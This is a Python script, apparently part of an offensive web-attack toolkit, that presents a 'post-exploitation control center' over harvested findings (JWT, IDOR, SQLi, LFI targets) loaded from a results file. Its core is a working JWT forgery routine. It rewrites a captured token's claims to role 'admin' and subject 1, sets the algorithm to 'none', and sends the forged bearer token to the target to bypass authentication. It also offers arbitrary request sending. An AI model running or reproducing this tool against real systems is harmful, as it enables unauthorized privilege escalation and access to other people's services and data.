import os
import sys
import json
import urllib.request
import urllib.error
import base64

RESULTS_FILE = "scan_results.json"

def load_findings():
    if not os.path.exists(RESULTS_FILE):
        return []
    with open(RESULTS_FILE, "r") as f:
        try:
            return json.load(f)
        except Exception:
            return []

def run_target_shell(target_url, vuln_type, token=None, param=None):
    print("=" * 65)
    print(f" [*] INTERACTIVE SESSION [{vuln_type.upper()}]")
    print(f" [*] Target: {target_url}")
    print("=" * 65)
    print(" Type 'help' for available commands, or 'exit' to return to dashboard.")
    
    while True:
        try:
            cmd = input(f"(target session)> ").strip()
        except (KeyboardInterrupt, EOFError):
            break

        if cmd == "exit" or cmd == "quit":
            break
        elif cmd == "help":
            print("    Commands:")
            print("      info        - View current target and vulnerability details")
            print("      exploit     - Re-run the automated exploit/bypass against target")
            print("      curl        - Send a custom test request to the target")
            print("      exit        - Return to the main dashboard")
        elif cmd == "info":
            print(f"    Target URL : {target_url}")
            print(f"    Vector Type: {vuln_type}")
            print(f"    Parameter  : {param or 'N/A'}")
            print(f"    Token      : {token[:30] + '...' if token else 'N/A'}")
        elif cmd == "exploit":
            if vuln_type == "JWT" and token:
                print("[*] Re-running Forged Admin JWT Bypass...")
                try:
                    parts = token.split('.')
                    padding = '=' * (4 - len(parts[1]) % 4)
                    payload = json.loads(base64.urlsafe_b64decode(parts[1] + padding).decode('utf-8'))
                    payload["role"] = "admin"
                    payload["sub"] = 1
                    
                    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=' * (4 - len(parts[0]) % 4)).decode('utf-8'))
                    header["alg"] = "none"
                    
                    def enc(d):
                        return base64.urlsafe_b64encode(json.dumps(d, separators=(',', ':')).encode('utf-8')).decode('utf-8').rstrip('=')
                    
                    forged_token = f"{enc(header)}.{enc(payload)}."
                    
                    req = urllib.request.Request(target_url, headers={
                        'User-Agent': 'Mozilla/5.0',
                        'Authorization': f'Bearer {forged_token}'
                    })
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        body = resp.read().decode('utf-8', errors='ignore')
                        print(f"    [!] SUCCESS! Response (HTTP {resp.getcode()}):")
                        print(f"        {body}")
                except Exception as e:
                    print(f"    [-] Exploit failed: {e}")
            else:
                print(f"[*] Executing generic test against {target_url}...")
                try:
                    req = urllib.request.Request(target_url, headers={'User-Agent': 'Mozilla/5.0'})
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        print(f"    [+] Response HTTP {resp.getcode()}: {resp.read().decode('utf-8', errors='ignore')[:200]}")
                except Exception as e:
                    print(f"    [-] Request failed: {e}")
        elif cmd.startswith("curl "):
            custom_url = cmd.split(" ", 1)[1]
            try:
                req = urllib.request.Request(custom_url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=3) as resp:
                    print(f"    [+] HTTP {resp.getcode()}:\n{resp.read().decode('utf-8', errors='ignore')}")
            except Exception as e:
                print(f"    [-] Error: {e}")
        else:
            print(f"    [-] Unknown command '{cmd}'. Type 'help' for options.")

def main_console():
    findings = load_findings()
    if not findings:
        print("[-] No scan results found. Run the autonomous pipeline (Option 1) first.")
        input("\nPress Enter to return...")
        return

    while True:
        print("\n" + "=" * 65)
        print(" [*] ACCESS GAINED & POST-EXPLOITATION CONTROL CENTER")
        print("=" * 65)
        print(f" [+] Loaded {len(findings)} harvested vector(s).\n")
        print(" [Harvested Assets & Interactive Shells]")
        print("  1) JWT Tokens & Privilege Escalation Targets")
        print("  2) IDOR / BOLA Endpoints")
        print("  3) SQLi & LFI Discovered Vectors")
        print("  4) Open Custom Manual Target Session")
        print("  5) Return to Main Menu")
        print("-" * 65)
        
        choice = input("Select action [1-5]: ").strip()

        if choice == "1":
            jwt_items = [f for f in findings if f.get("vulnerability") == "JWT"]
            if not jwt_items:
                print("[-] No JWT tokens found.")
                continue
            print("\n[★] JWT Assets:")
            for idx, item in enumerate(jwt_items, 1):
                print(f"    {idx}) {item.get('target')}")
            sel = input("\nSelect index to open interactive shell (or Enter to go back): ").strip()
            if sel.isdigit() and 1 <= int(sel) <= len(jwt_items):
                item = jwt_items[int(sel) - 1]
                run_target_shell(item.get("target"), "JWT", token=item.get("token"))

        elif choice == "2":
            idor_items = [f for f in findings if f.get("vulnerability") == "IDOR"]
            if not idor_items:
                print("[-] No IDOR endpoints found.")
                continue
            print("\n[★] IDOR Endpoints:")
            for idx, item in enumerate(idor_items, 1):
                print(f"    {idx}) {item.get('target')} (Param: {item.get('param')})")
            sel = input("\nSelect index to open interactive shell (or Enter to go back): ").strip()
            if sel.isdigit() and 1 <= int(sel) <= len(idor_items):
                item = idor_items[int(sel) - 1]
                run_target_shell(item.get("target"), "IDOR", param=item.get("param"))

        elif choice == "3":
            other_items = [f for f in findings if f.get("vulnerability") in ["SQLi", "LFI"]]
            if not other_items:
                print("[-] No SQLi/LFI vectors found.")
                continue
            print("\n[★] SQLi / LFI Vectors:")
            for idx, item in enumerate(other_items, 1):
                print(f"    {idx}) [{item.get('vulnerability')}] {item.get('target')}")
            sel = input("\nSelect index to open interactive shell (or Enter to go back): ").strip()
            if sel.isdigit() and 1 <= int(sel) <= len(other_items):
                item = other_items[int(sel) - 1]
                run_target_shell(item.get("target"), item.get("vulnerability"), param=item.get("param"))

        elif choice == "4":
            url = input("Enter custom target URL: ").strip()
            run_target_shell(url, "Manual")

        elif choice == "5":
            break
        else:
            print("[-] Invalid selection.")

if __name__ == "__main__":
    main_console()
